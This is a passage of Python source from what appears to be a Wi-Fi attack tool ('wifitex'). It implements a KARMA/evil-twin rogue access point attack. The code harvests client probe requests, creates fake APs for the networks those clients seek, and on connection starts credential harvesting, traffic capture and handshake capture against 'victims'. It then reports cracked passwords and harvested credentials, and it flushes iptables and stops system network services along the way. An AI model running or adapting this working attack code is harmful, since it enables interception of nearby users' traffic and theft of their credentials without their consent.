        """Enhanced check for association requests to our rogue AP"""
        try:
            # Use tshark to find association requests with more details
            cmd = [
                'tshark',
                '-r', capfile,
                '-Y', 'wlan.fc.type_subtype == 0x00',  # Association request
                '-T', 'fields',
                '-e', 'frame.time',
                '-e', 'wlan.sa',  # Client MAC
                '-e', 'wlan.da',  # AP MAC
                '-e', 'wlan.ssid'  # SSID
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if line.strip() and '\t' in line:
                        parts = line.split('\t')
                        if len(parts) >= 4:
                            timestamp = parts[0]
                            client_mac = parts[1].strip()
                            ap_mac = parts[2].strip()
                            ssid = parts[3].strip() if len(parts) > 3 else 'Unknown'
                            
                            # Check if this is an association request to our rogue AP
                            rogue_bssid = self._get_rogue_ap_bssid()
                            if rogue_bssid and ap_mac.lower() == rogue_bssid.lower():
                                Color.pl('{+} {G}🎯 Client {C}%s{W} connecting to rogue AP {G}%s{W} (SSID: {C}%s{W}){W}' % 
                                        (client_mac, ap_mac, ssid))
                                
                                # Add to connected clients
                                if client_mac not in self.connected_clients:
                                    self.connected_clients.add(client_mac)
                                    
                                    # Start immediate monitoring for this client
                                    threading.Thread(
                                        target=self.monitor_new_client,
                                        args=(client_mac,),
                                        name=f'monitor_{client_mac.replace(":", "")}'
                                    ).start()
                            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error checking association requests: {O}%s{W}' % str(e))
    
    def check_probe_requests_enhanced(self, capfile):
        """Enhanced check for probe requests (potential victims)"""
        try:
            # Use tshark to find probe requests with SSID information
            cmd = [
                'tshark',
                '-r', capfile,
                '-Y', 'wlan.fc.type_subtype == 0x04',  # Probe request
                '-T', 'fields',
                '-e', 'frame.time',
                '-e', 'wlan.sa',  # Client MAC
                '-e', 'wlan.ssid'  # Requested SSID
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if line.strip() and '\t' in line:
                        parts = line.split('\t')
                        if len(parts) >= 3:
                            timestamp = parts[0]
                            client_mac = parts[1].strip()
                            ssid = parts[2].strip()
                            
                            if ssid and ssid != '':
                                # Track client's preferred networks
                                if client_mac not in self.client_probes:
                                    self.client_probes[client_mac] = []
                                
                                if ssid not in self.client_probes[client_mac]:
                                    self.client_probes[client_mac].append(ssid)
                                    Color.pl('{+} {C}📡 Client {G}%s{W} probing for {C}%s{W}' % (client_mac, ssid))
                                    
                                    # Check if we can create a rogue AP for this SSID
                                    if ssid not in [net['essid'] for net in self.rogue_ap_networks]:
                                        self.add_rogue_ap_network(
                                            bssid=self._get_rogue_ap_bssid(),
                                            essid=ssid,
                                            clients=[client_mac]
                                        )
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error checking probe requests: {O}%s{W}' % str(e))
    
    def monitor_new_client(self, client_mac):
        """Monitor a newly connected client"""
        try:
            Color.pl('{+} {G}🔍 Starting comprehensive monitoring for {C}%s{W}...' % client_mac)
            
            # Start credential harvesting
            threading.Thread(
                target=self.harvest_credentials_from_client,
                args=(client_mac,),
                name=f'harvest_{client_mac.replace(":", "")}'
            ).start()
            
            # Start traffic capture
            threading.Thread(
                target=self.capture_client_traffic,
                args=(client_mac,),
                name=f'traffic_{client_mac.replace(":", "")}'
            ).start()
            
            # Start handshake capture
            threading.Thread(
                target=self.start_async_handshake_capture,
                args=(client_mac,),
                name=f'handshake_{client_mac.replace(":", "")}'
            ).start()
            
        except Exception as e:
            Color.pl('{!} {R}Error monitoring new client: {O}%s{W}' % str(e))
    
    def start_monitoring(self):
        """Start unified monitoring with all attack components"""
        Color.pl('{+} {C}Starting KARMA monitoring - All components active{W}')
        
        try:
            # Start credential harvesting in background
            harvest_thread = threading.Thread(target=self.monitor_credential_harvesting)
            harvest_thread.daemon = True  # Consistent daemon setting
            harvest_thread.start()
            
            # Start connection attempt monitoring in background
            connection_monitor_thread = threading.Thread(target=self.monitor_client_connection_attempts)
            connection_monitor_thread.daemon = True
            connection_monitor_thread.start()
            
            # Start victim management
            self.start_victim_management()
            
            Color.pl('{+} {G}Waiting for victims to connect...{W}')
            
            while self.running:
                # Monitor connections
                self.monitor_connections()
                
                # Show status
                self.show_attack_status()
                
                time.sleep(5)
                
        except KeyboardInterrupt:
            Color.pl('{!} {O}KARMA attack interrupted by user{W}')
            # Ensure cleanup runs when interrupted
            self.cleanup()
        except Exception as e:
            Color.pl('{!} {R}Monitoring error: {O}%s{W}' % str(e))
            # Ensure cleanup runs on error
            self.cleanup()
    
    def start_dual_interface_monitoring(self):
        """Start monitoring for dual interface mode (probe capture + rogue AP simultaneously)"""
        Color.pl('{+} {C}Starting dual interface monitoring{W}')
        Color.pl('{+} {G}Probe capture: {C}%s{W} (monitor mode){W}' % self.probe_interface)
        Color.pl('{+} {G}Rogue AP: {C}%s{W} (managed mode){W}' % self.rogue_interface)
        
        try:
            # Start continuous probe capture in background
            probe_thread = threading.Thread(target=self.continuous_probe_capture)
            probe_thread.daemon = True  # Consistent daemon setting
            probe_thread.start()
            
            # Start credential harvesting in background
            harvest_thread = threading.Thread(target=self.monitor_credential_harvesting)
            harvest_thread.daemon = True  # Consistent daemon setting
            harvest_thread.start()
            
            # Start connection attempt monitoring in background
            connection_monitor_thread = threading.Thread(target=self.monitor_client_connection_attempts)
            connection_monitor_thread.daemon = True
            connection_monitor_thread.start()
            
            # Start victim management
            self.start_victim_management()
            
            Color.pl('{+} {G}Dual interface monitoring active - waiting for victims...{W}')
            
            while self.running:
                # Monitor connections
                self.monitor_connections()
                
                # Show status
                self.show_attack_status()
                
                time.sleep(5)
                
        except KeyboardInterrupt:
            Color.pl('{!} {O}KARMA attack interrupted by user{W}')
            # Ensure cleanup runs when interrupted
            self.cleanup()
        except Exception as e:
            Color.pl('{!} {R}Dual interface monitoring error: {O}%s{W}' % str(e))
            # Ensure cleanup runs on error
            self.cleanup()
    
    def continuous_probe_capture(self):
        """Continuous probe capture for dual interface mode"""
        try:
            Color.pl('{+} {C}Starting continuous probe capture on {G}%s{W}...{W}' % self.probe_interface)
            
            while self.running:
                # Capture probe requests for 30 seconds
                with Airodump(interface=self.probe_interface, 
                             output_file_prefix='karma_continuous',
                             delete_existing_files=False) as airodump:
                    
                    timer = Timer(30)  # 30 second intervals
                    while not timer.ended() and self.running:
                        time.sleep(1)
                    
                    # Parse new probe requests
                    self.parse_continuous_probes()
                    
        except Exception as e:
            Color.pl('{!} {R}Continuous probe capture error: {O}%s{W}' % str(e))
    
    def parse_continuous_probes(self):
        """Parse continuous probe requests and update PNL"""
        try:
            # This would parse the continuous airodump output
            # and update the PNL with new networks
            pass
        except Exception as e:
            Color.pl('{!} {R}Error parsing continuous probes: {O}%s{W}' % str(e))

    def log_status(self, message, level='info'):
        """Helper method for consistent logging"""
        if level == 'info':
            Color.pl('{+} {C}%s{W}' % message)
        elif level == 'success':
            Color.pl('{+} {G}%s{W}' % message)
        elif level == 'warning':
            Color.pl('{!} {O}%s{W}' % message)
        elif level == 'error':
            Color.pl('{!} {R}%s{W}' % message)
        elif level == 'debug' and Configuration.verbose > 1:
            Color.pl('{+} {C}[DEBUG] %s{W}' % message)
    
    def log_phase(self, phase_name, action):
        """Log phase transitions consistently"""
        Color.pl('{+} {C}%s: %s{W}' % (phase_name, action))
        if hasattr(self, 'target') and self.target:
            Color.pattack('KARMA', self.target, phase_name, action)
    
    
    def check_interface_permissions(self):
        """Check if the interface has proper permissions for hostapd"""
        try:
            # Check if running as root
            if os.geteuid() != 0:
                error_msg = 'KARMA attack requires root privileges'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Run with: sudo python -m wifitex.gui{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            # Check if interface exists using dynamic detection
            from ..gui.utils import SystemUtils
            interfaces = SystemUtils.get_wireless_interfaces()
            interface = interfaces[0] if interfaces else None
            
            if not interface:
                error_msg = 'No wireless interface found'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Check interface name and ensure monitor mode is enabled{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            if not os.path.exists(f'/sys/class/net/{interface}'):
                error_msg = f'Interface {interface} not found'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Check interface name and ensure monitor mode is enabled{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            # Check if NetworkManager is interfering
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], 
                                      capture_output=True, text=True, timeout=2)
                if result.returncode == 0 and 'active' in result.stdout:
                    Color.pl('{!} {O}Warning: NetworkManager is running - may interfere with hostapd{W}')
                    Color.pl('{!} {O}If hostapd fails, try: sudo systemctl stop NetworkManager{W}')
            except Exception:
                pass  # Ignore if systemctl is not available
            
            return True
            
        except Exception as e:
            error_msg = f'Error checking interface permissions: {str(e)}'
            Color.pl('{!} {R}%s{W}' % error_msg)
            
            # Also log to GUI
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
            return False
    
    
    
    def stop_network_manager(self):
        """Stop NetworkManager if it's interfering with hostapd"""
        try:
            # Check if NetworkManager is running
            result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], 
                                  capture_output=True, text=True, timeout=2)
            
            if result.returncode == 0 and 'active' in result.stdout:
                Color.pl('{!} {O}NetworkManager is running - stopping to prevent conflicts{W}')
                
                # Stop NetworkManager
                stop_result = subprocess.run(['systemctl', 'stop', 'NetworkManager'], 
                                           capture_output=True, text=True, timeout=5)
                
                if stop_result.returncode == 0:
                    Color.pl('{+} {G}NetworkManager stopped successfully{W}')
                    return True
                else:
                    Color.pl('{!} {R}Failed to stop NetworkManager: {O}%s{W}' % stop_result.stderr.strip())
                    Color.pl('{!} {O}Try manually: sudo systemctl stop NetworkManager{W}')
                    return False
            else:
                Color.pl('{+} {G}NetworkManager is not running - no conflict{W}')
                return True
                
        except Exception as e:
            Color.pl('{!} {O}Could not check NetworkManager status: {O}%s{W}' % str(e))
            return True  # Continue anyway
    
    
    
    def find_monitor_interface(self, base_interface):
        """Find the monitor mode interface name"""
        try:
            # Use system detection to find actual interfaces - no hardcoded names
            possible_names = SystemUtils.get_wireless_interfaces()
            
            for name in possible_names:
                try:
                    result = subprocess.run(['iwconfig', name], capture_output=True, text=True, timeout=3)
                    if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
                        return name
                except:
                    continue
            
            # If not found, try to get from iw dev (no airmon-ng needed)
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if base_interface in line and 'mon' in line:
                        parts = line.split()
                        if parts:
                            return parts[0]
            
            return None
            
        except Exception as e:
            Color.pl('{!} {R}Error finding monitor interface: {O}%s{W}' % str(e))
            return None

    def final_interface_preparation(self):
        """Final interface preparation steps before starting hostapd"""
        try:
            interface = getattr(self, 'rogue_interface', None)
            if not interface:
                from ..gui.utils import SystemUtils
                interfaces = SystemUtils.get_wireless_interfaces()
                interface = interfaces[0] if interfaces else None
            
            # Check if we have a valid interface
            if not interface:
                Color.pl('{!} {R}No interface available for final preparation{W}')
                return False
            
            Color.pl('{+} {C}Performing final interface preparation...{W}')
            
            # Clean up interface name - convert monitor interfaces to base interfaces
            interface = self.cleanup_interface_name(interface)
            
            # Kill any existing hostapd processes on this interface
            Color.pl('{+} {C}Cleaning up existing hostapd processes...{W}')
            subprocess.run(['pkill', '-f', f'hostapd.*{interface}'], capture_output=True, timeout=5)
            subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True, timeout=5)
            time.sleep(3)
            
            # Reset interface state completely
            Color.pl('{+} {C}Resetting interface state...{W}')
            subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=5)
            time.sleep(2)
            
            # Try to reset the interface using iw
            try:
                subprocess.run(['iw', interface, 'set', 'type', 'managed'], capture_output=True, timeout=5)
                time.sleep(1)
            except:
                pass
            
            # Bring interface back up
            subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=5)
            time.sleep(2)
            
            # Check current interface mode
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                if 'Mode:Master' in result.stdout or 'Mode:AP' in result.stdout:
                    Color.pl('{+} {G}Interface {G}%s{W} is already in AP mode - skipping mode change{W}' % interface)
                    return True
                elif 'Mode:Managed' in result.stdout:
                    Color.pl('{+} {C}Interface {G}%s{W} is in managed mode - switching to AP mode{W}' % interface)
                    # Switch to master mode for hostapd
                    success = self.switch_to_master_mode(interface)
                    if not success:
                        Color.pl('{!} {R}Failed to switch interface to AP mode{W}')
                        return False
                    return True
                else:
                    Color.pl('{+} {C}Interface {G}%s{W} mode unknown - attempting to set AP mode{W}' % interface)
                    # Switch to master mode for hostapd
                    success = self.switch_to_master_mode(interface)
                    if not success:
                        Color.pl('{!} {R}Failed to switch interface to AP mode{W}')
                        return False
                    return True
            else:
                Color.pl('{!} {R}Failed to check interface mode{W}')
                return False
                
        except Exception as e:
            Color.pl('{!} {R}Error in final interface preparation: {O}%s{W}' % str(e))
            return False

    def fix_permission_issues(self):
        """Fix common permission issues"""
        try:
            # Check if running as root
            if os.geteuid() != 0:
                Color.pl('{!} {R}KARMA attack requires root privileges{W}')
                Color.pl('{!} {O}Run with: sudo python -m wifitex.gui{W}')
                return False
            
            # Fix tun device permissions using dynamic device path
            tun_device = '/dev/net/tun'
            if os.path.exists(tun_device):
                try:
                    subprocess.run(['chmod', '666', tun_device], check=True)
                    Color.pl('{+} {G}Fixed tun device permissions{W}')
                except subprocess.CalledProcessError:
                    Color.pl('{!} {O}Could not fix tun device permissions{W}')
            
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error fixing permissions: {O}%s{W}' % str(e))
            return False
    
    
    
    def verify_ap_running(self):
        """Verify that the AP is actually running"""
        try:
            # Check if hostapd process is running
            result = subprocess.run(['pgrep', '-f', 'hostapd'], capture_output=True, text=True, timeout=3)
            if result.returncode == 0 and result.stdout.strip():
                Color.pl('{+} {G}hostapd process is running{W}')
                return True
            
            # Check interface state
            interface = getattr(self, 'rogue_interface', None)
            if not interface:
                try:
                    from ..gui.utils import SystemUtils
                    detected = SystemUtils.get_wireless_interfaces()
                    interface = detected[0] if detected else 'unknown'
                except Exception:
                    interface = 'unknown'
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if result.returncode == 0 and 'Mode:Master' in result.stdout:
                Color.pl('{+} {G}Interface is in Master mode (AP mode){W}')
                return True
            
            return False
            
        except Exception as e:
            Color.pl('{!} {O}Error verifying AP status: {O}%s{W}' % str(e))
            return False
    
    def cleanup(self):
        """Clean up processes and temporary files"""
        if getattr(self, '_cleanup_done', False):
            return
        self._cleanup_done = True
        Color.pl('\n{+} {C}Cleaning up Enhanced KARMA attack...{W}')
        
        self.running = False
        self.deauth_active = False
        self.handshake_capture_active = False
        
        # Clean up handshake capture threads
        self.cleanup_all_capture_threads()
        
        # Clean up active threads to prevent resource leaks
        if hasattr(self, 'active_threads') and self.active_threads:
            Color.pl('{+} {C}Cleaning up active threads...{W}')
            for thread in self.active_threads:
                if thread.is_alive():
                    Color.pl('{+} {C}Waiting for thread: {G}%s{W}' % thread.name)
                    thread.join(timeout=5)  # Wait up to 5 seconds
            self.active_threads.clear()
            Color.pl('{+} {G}Thread cleanup completed{W}')
        
        # Clean up all registered processes
        self.cleanup_all_processes()
        
        # Switch back to probe mode if using single interface
        if self.probe_interface == self.rogue_interface:
            Color.pl('{+} {C}Switching interface back to monitor mode for cleanup{W}')
            self.switch_interface_mode('monitor', 'Cleanup')
        
        # Stop main processes
        if self.rogue_ap_process:
            try:
                self.rogue_ap_process.terminate()
                Color.pl('{+} {G}Stopped primary Evil Twin AP{W}')
            except:
                pass
        
        # Stop DHCP server only if DNS spoofing was enabled
        if hasattr(self, 'dns_spoofing_enabled') and self.dns_spoofing_enabled and self.dhcp_process:
            try:
                self.dhcp_process.terminate()
                Color.pl('{+} {G}Stopped DHCP server{W}')
            except:
                pass
        
        # Stop additional Evil Twin processes
        if hasattr(self, 'additional_processes') and self.additional_processes:
            for i, process in enumerate(self.additional_processes, 1):
                try:
                    process.terminate()
                    Color.pl('{+} {G}Stopped additional Evil Twin AP {C}%d{W}' % i)
                except:
                    pass
        
        # Clean up iptables rules if DNS spoofing or internet access was enabled
        if (hasattr(self, 'dns_spoofing_enabled') and self.dns_spoofing_enabled) or getattr(Configuration, 'karma_internet_access', False):
            try:
                subprocess.run(['iptables', '-F'], capture_output=True)
                subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
                Color.pl('{+} {G}Cleaned up iptables rules{W}')
            except:
                pass
        
        # Disable IP forwarding if internet access was enabled
        if getattr(Configuration, 'karma_internet_access', False):
            try:
                subprocess.run(['echo', '0'], stdout=open('/proc/sys/net/ipv4/ip_forward', 'w'), check=True)
                Color.pl('{+} {G}Disabled IP forwarding{W}')
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to disable IP forwarding: {R}%s{W}' % str(e))
        
        # Clean up temporary files
        try:
            if hasattr(self, 'hostapd_config') and self.hostapd_config and os.path.exists(self.hostapd_config):
                os.remove(self.hostapd_config)
            if hasattr(self, 'dnsmasq_config') and self.dnsmasq_config and os.path.exists(self.dnsmasq_config):
                os.remove(self.dnsmasq_config)
            
            # Clean up additional config files
            if hasattr(self, 'additional_processes') and self.additional_processes:
                for i in range(len(self.additional_processes)):
                    config_pattern = f'*_unique_*.conf'
                    import glob
                    for config_file in glob.glob(config_pattern):
                        try:
                            os.remove(config_file)
                        except:
                            pass
            
            Color.pl('{+} {G}Cleaned up temporary files{W}')
        except:
            pass
        
        # Show final results
        self.show_final_results()
        
        # Fully restore network stack for subsequent runs
        try:
            self.restore_network_services()
        except Exception as e:
            Color.pl('{!} {R}Warning: Failed to restore network services: {O}%s{W}' % str(e))
            # Try basic cleanup even if restore fails
            self.basic_cleanup()
        
        Color.pl('{+} {G}Enhanced KARMA attack cleanup complete{W}')
        
        # Check if rfkill is still blocking interfaces
        try:
            result = subprocess.run(['rfkill', 'list'], capture_output=True, text=True)
            if 'Soft blocked: yes' in result.stdout:
                Color.pl('{!} {R}WARNING: Some wireless interfaces are still blocked!{W}')
                Color.pl('{!} {O}Run the following commands to restore your network:{W}')
                Color.pl('{!}   {C}sudo rfkill unblock all{W}')
                Color.pl('{!}   {C}sudo ./dev_restore.sh{W}')
                Color.pl('{!} {O}Or use the development restoration script in the project root{W}')
        except:
            pass

    def restore_network_services(self):
        """Enhanced restoration of services, iptables, and interface state after attack"""
        Color.pl('{+} {C}Performing enhanced network restoration for optimal scanning...{W}')
        
        # Kill processes
        try:
            subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True)
            Color.pl('{+} {G}Killed hostapd processes{W}')
        except Exception as e:
            Color.pl('{!} {O}Warning: Failed to kill hostapd: {R}%s{W}' % str(e))

        # Only kill dnsmasq if DNS spoofing was enabled
        if hasattr(self, 'dns_spoofing_enabled') and self.dns_spoofing_enabled:
            try:
                subprocess.run(['pkill', '-f', 'dnsmasq'], capture_output=True)
                Color.pl('{+} {G}Killed dnsmasq processes{W}')
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to kill dnsmasq: {R}%s{W}' % str(e))

        # Kill web server if credential harvesting was enabled
        if hasattr(self, 'web_server_process') and self.web_server_process:
            try:
                self.web_server_process.terminate()
                self.web_server_process.wait(timeout=5)
                Color.pl('{+} {G}Stopped credential harvesting web server{W}')
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to stop web server: {R}%s{W}' % str(e))
        
        # Also kill any remaining python http.server processes
        try:
            subprocess.run(['pkill', '-f', 'python.*http.server'], capture_output=True)
        except Exception:
            pass

        # Kill any remaining attack processes
        try:
            subprocess.run(['pkill', '-f', 'airodump'], capture_output=True)
            subprocess.run(['pkill', '-f', 'aireplay'], capture_output=True)
            # Clean up any remaining wireless processes
            subprocess.run(['pkill', '-f', 'iwconfig'], capture_output=True)
            Color.pl('{+} {G}Killed remaining attack processes{W}')
        except Exception as e:
            Color.pl('{!} {O}Warning: Failed to kill attack processes: {R}%s{W}' % str(e))

        # Disable IP forwarding
        try:
            result = subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True, text=True)
            if result.returncode == 0:
                Color.pl('{+} {G}Disabled IP forwarding{W}')
            else:
                Color.pl('{!} {O}Warning: Failed to disable IP forwarding{W}')
        except Exception as e:
            Color.pl('{!} {O}Warning: Failed to disable IP forwarding: {R}%s{W}' % str(e))

        # Clean iptables
        try:
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
            subprocess.run(['iptables', '-F'], capture_output=True)
            Color.pl('{+} {G}Cleaned iptables rules{W}')
        except Exception as e:
            Color.pl('{!} {O}Warning: Failed to clean iptables: {R}%s{W}' % str(e))

        # Enhanced rfkill unblocking
        try:
            result = subprocess.run(['rfkill', 'unblock', 'all'], capture_output=True, text=True)
            if result.returncode == 0:
                Color.pl('{+} {G}Unblocked all rfkill devices{W}')
            else:
                Color.pl('{!} {R}CRITICAL: Failed to unblock rfkill devices{W}')
                Color.pl('{!} {O}Run manually: {C}sudo rfkill unblock all{W}')
        except Exception as e:
            Color.pl('{!} {R}CRITICAL: Failed to unblock rfkill: {O}%s{W}' % str(e))
            Color.pl('{!} {O}Run manually: {C}sudo rfkill unblock all{W}')

        # Enhanced interface restoration for optimal scanning
        self.enhanced_interface_restoration()

        # Restart network services for optimal scanning
        self.restart_network_services_for_scanning()
        
        # Wait for services to stabilize
        Color.pl('{+} {C}Waiting for network services to stabilize...{W}')
        time.sleep(3)
        
        # Verify restoration
        self.verify_network_restoration()
    
    def enhanced_interface_restoration(self):
        """Enhanced interface restoration for optimal scanning"""
        try:
            Color.pl('{+} {C}Performing enhanced interface restoration...{W}')
            
            # Get all wireless interfaces
            interfaces_to_restore = []
            if hasattr(self, 'probe_interface') and self.probe_interface:
                interfaces_to_restore.append(self.probe_interface)
            if hasattr(self, 'rogue_interface') and self.rogue_interface:
                interfaces_to_restore.append(self.rogue_interface)
            
            # Also check for common interface names
            common_interfaces = ['wlan0', 'wlan1', 'wlan2', 'wlp3s0', 'wlp4s0']
            for iface in common_interfaces:
                try:
                    result = subprocess.run(['iwconfig', iface], capture_output=True, timeout=2)
                    if result.returncode == 0 and iface not in interfaces_to_restore:
                        interfaces_to_restore.append(iface)
                except:
                    pass
            
            # Restore each interface
            for iface in interfaces_to_restore:
                try:
                    Color.pl('{+} {C}Restoring interface {G}%s{W} for optimal scanning...{W}' % iface)
                    
                    # Switch interface to managed mode if it's in monitor mode
                    try:
                        result = subprocess.run(['iwconfig', iface], capture_output=True, text=True, timeout=3)
                        if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
                            Color.pl('{+} {C}Switching {G}%s{W} from monitor to managed mode{W}' % iface)
                            subprocess.run(['iwconfig', iface, 'mode', 'managed'], capture_output=True, timeout=5)
                    except:
                        pass
                    
                    # Bring interface down
                    subprocess.run(['ip', 'link', 'set', iface, 'down'], capture_output=True, timeout=5)
                    time.sleep(1)
                    
                    # Set to managed mode
                    subprocess.run(['iw', 'dev', iface, 'set', 'type', 'managed'], capture_output=True, timeout=5)
                    time.sleep(1)
                    
                    # Flush IP addresses
                    subprocess.run(['ip', 'addr', 'flush', 'dev', iface], capture_output=True, timeout=5)
                    
                    # Bring interface up
                    subprocess.run(['ip', 'link', 'set', iface, 'up'], capture_output=True, timeout=5)
                    time.sleep(2)
                    
                    # Verify interface is working
                    result = subprocess.run(['iwconfig', iface], capture_output=True, text=True, timeout=3)
                    if result.returncode == 0 and 'Mode:Managed' in result.stdout:
                        Color.pl('{+} {G}Interface {G}%s{W} restored successfully{W}' % iface)
                    else:
                        Color.pl('{!} {O}Warning: Interface {G}%s{W} may not be fully restored{W}' % iface)
                    
                except Exception as e:
                    Color.pl('{!} {O}Warning: Failed to restore interface {G}%s{W}: {R}%s{W}' % (iface, str(e)))
            
        except Exception as e:
            Color.pl('{!} {R}Error in enhanced interface restoration: {O}%s{W}' % str(e))
    
    def restart_network_services_for_scanning(self):
        """Restart network services for optimal scanning"""
        try:
            Color.pl('{+} {C}Restarting network services for optimal scanning...{W}')
            
            # Restart NetworkManager for better scanning
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], capture_output=True)
                if result.returncode == 0:
                    subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True)
                    Color.pl('{+} {G}Restarted NetworkManager for optimal scanning{W}')
                else:
                    subprocess.run(['systemctl', 'start', 'NetworkManager'], capture_output=True)
                    Color.pl('{+} {G}Started NetworkManager for optimal scanning{W}')
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to restart NetworkManager: {R}%s{W}' % str(e))
            
            # Restart systemd-resolved
            try:
                result = subprocess.run(['systemctl', 'is-active', 'systemd-resolved'], capture_output=True)
                if result.returncode == 0:
                    subprocess.run(['systemctl', 'restart', 'systemd-resolved'], capture_output=True)
                    Color.pl('{+} {G}Restarted systemd-resolved{W}')
                else:
                    subprocess.run(['systemctl', 'start', 'systemd-resolved'], capture_output=True)
                    Color.pl('{+} {G}Started systemd-resolved{W}')
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to restart systemd-resolved: {R}%s{W}' % str(e))
            
        except Exception as e:
            Color.pl('{!} {R}Error restarting network services: {O}%s{W}' % str(e))
    
    def verify_network_restoration(self):
        """Verify that network restoration was successful"""
        try:
            Color.pl('{+} {C}Verifying network restoration...{W}')
            
            # Check rfkill status
            try:
                result = subprocess.run(['rfkill', 'list'], capture_output=True, text=True)
                if 'Soft blocked: yes' in result.stdout:
                    Color.pl('{!} {R}WARNING: Some interfaces are still blocked!{W}')
                    Color.pl('{!} {O}Run: {C}sudo rfkill unblock all{W}')
                else:
                    Color.pl('{+} {G}All interfaces are unblocked{W}')
            except:
                pass
                
            # Check NetworkManager status
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], capture_output=True, text=True)
                if 'active' in result.stdout:
                    Color.pl('{+} {G}NetworkManager is active{W}')
                else:
                    Color.pl('{!} {O}NetworkManager is not active{W}')
            except:
                pass
                
            # Check interface status
            try:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True)
                if 'Mode:Managed' in result.stdout:
                    Color.pl('{+} {G}Interfaces are in managed mode{W}')
                else:
                    Color.pl('{!} {O}Some interfaces may not be in managed mode{W}')
            except:
                pass
            
            Color.pl('{+} {G}Network restoration verification complete{W}')
            
        except Exception as e:
            Color.pl('{!} {R}Error verifying network restoration: {O}%s{W}' % str(e))
    
    def basic_cleanup(self):
        """Basic cleanup when main restore fails"""
        Color.pl('{!} {R}Performing basic cleanup...{W}')
        
        # Try to unblock rfkill at minimum
        try:
            subprocess.run(['rfkill', 'unblock', 'all'], capture_output=True)
            Color.pl('{+} {G}Basic cleanup: Unblocked rfkill devices{W}')
        except:
            Color.pl('{!} {R}CRITICAL: Basic cleanup failed - run manually: {C}sudo rfkill unblock all{W}')
        
        # Kill any remaining processes
        try:
            subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True)
            subprocess.run(['pkill', '-f', 'dnsmasq'], capture_output=True)
            Color.pl('{+} {G}Basic cleanup: Killed remaining processes{W}')
        except:
            pass
    
    def show_final_results(self):
        """Show final attack results and statistics"""
        try:
            Color.pl('\n{+} {C}=== Enhanced KARMA Attack Results ==={W}')
            
            if self.captured_handshakes:
                Color.pl('{+} {G}Handshakes Captured: {C}%d{W}' % len(self.captured_handshakes))
                for client, handshake_file in self.captured_handshakes.items():
                    Color.pl('  {G}* {W}%s: %s{W}' % (client, handshake_file))
            
            if self.cracked_passwords:
                Color.pl('{+} {G}Passwords Cracked: {C}%d{W}' % len(self.cracked_passwords))
                for client, password in self.cracked_passwords.items():
                    Color.pl('  {G}* {W}%s: {R}%s{W}' % (client, password))
            
            if self.harvested_credentials:
                Color.pl('{+} {G}Credentials Harvested: {C}%d{W}' % len(self.harvested_credentials))
                for client, credentials in self.harvested_credentials.items():
                    Color.pl('  {G}* {W}%s: {C}%d{W} credentials' % (client, len(credentials)))
            
            if self.connected_clients:
                Color.pl('{+} {G}Total Clients Connected: {C}%d{W}' % len(self.connected_clients))
            
            if self.pnl_networks:
                Color.pl('{+} {G}PNL Networks Captured: {C}%d{W}' % len(self.pnl_networks))
            
            Color.pl('{+} {C}=== End of Results ==={W}')
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error showing results: {O}%s{W}' % str(e))
    
    def get_karma_status(self):
        """Get KARMA status for GUI - returns dict with all status information"""
        try:
            status = {
                'connected_clients': list(self.connected_clients) if self.connected_clients else [],
                'connected_count': len(self.connected_clients),
                'handshakes_captured': len(self.captured_handshakes),
                'passwords_cracked': len(self.cracked_passwords),
                'credentials_harvested': len(self.harvested_credentials),
                'pnl_networks': len(self.pnl_networks),
                'client_details': []
            }
            
            # Add detailed client information
            for client_mac in self.connected_clients:
                client_info = {
                    'mac': client_mac,
                    'has_handshake': client_mac in self.captured_handshakes,
                    'password_cracked': client_mac in self.cracked_passwords,
                    'has_credentials': client_mac in self.harvested_credentials,
                    'probe_ssids': self.client_probes.get(client_mac, [])
                }
                
